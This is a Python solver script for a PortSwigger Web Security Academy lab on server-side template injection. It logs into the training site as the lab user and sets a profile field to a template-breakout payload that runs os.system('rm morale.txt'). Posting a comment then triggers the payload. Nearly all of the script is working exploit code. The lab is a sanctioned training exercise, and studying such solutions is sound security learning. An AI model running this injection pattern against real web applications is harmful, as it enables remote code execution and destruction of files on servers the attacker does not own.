###############################################################
#
# Lab: Basic server-side template injection (code context)
#
# Hack Steps:
#      1. Fetch the login page
#      2. Extract the csrf token and session cookie to login
#      3. Login as wiener
#      4. Fetch wiener's profile
#      5. Set the preferred name with the malicious payload
#      6. Post a comment as wiener
#      7. Fetch the post page to execute the payload
#
###############################################################
import requests
import re
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a4e00440370d2fb81d7bba100150059.web-security-academy.net"

def main():
    print("⦗1⦘ Fetching the login page.. ", end="", flush=True)
    
    login_page = fetch("/login")

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Extracting the csrf token and session cookie.. ", end="", flush=True)
    
    session = login_page.cookies.get("session")
    csrf_token = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗3⦘ Logging in as wiener.. ", end="", flush=True)

    data = { "username": "wiener", "password": "peter", "csrf": csrf_token }
    cookies = { "session": session }
    wiener_login = post_data("/login", data, cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗4⦘ Fetching wiener's profile.. ", end="", flush=True)

    session = wiener_login.cookies.get("session")
    cookies = { "session": session }
    wiener_profile = fetch("/my-account", cookies)
   
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗5⦘ Setting the preferred name with the malicious payload.. ", end="", flush=True)

    csrf_token = re.findall("csrf.+value=\"(.+)\"", wiener_profile.text)[0]
    payload = r"""user.first_name}}{%import os;os.system('rm morale.txt')%}"""
    data = { "csrf": csrf_token, "blog-post-author-display": payload }
    post_data("/my-account/change-blog-post-author-display", data, cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗6⦘ Posting a comment as wiener.. ", end="", flush=True)

    data = { "postId": "1", "comment": "to execute the malicious payload", "csrf": csrf_token }
    post_data("/post/comment", data, cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗7⦘ Fetch the post page to execute the payload.. ", end="", flush=True)

    fetch("/post?postId=1") # postId should be the same as the one used in posting a comment

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The morale.txt file is successfully deleted")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(path, cookies = None):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data, cookies = None):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)


if __name__ == "__main__":
    main()

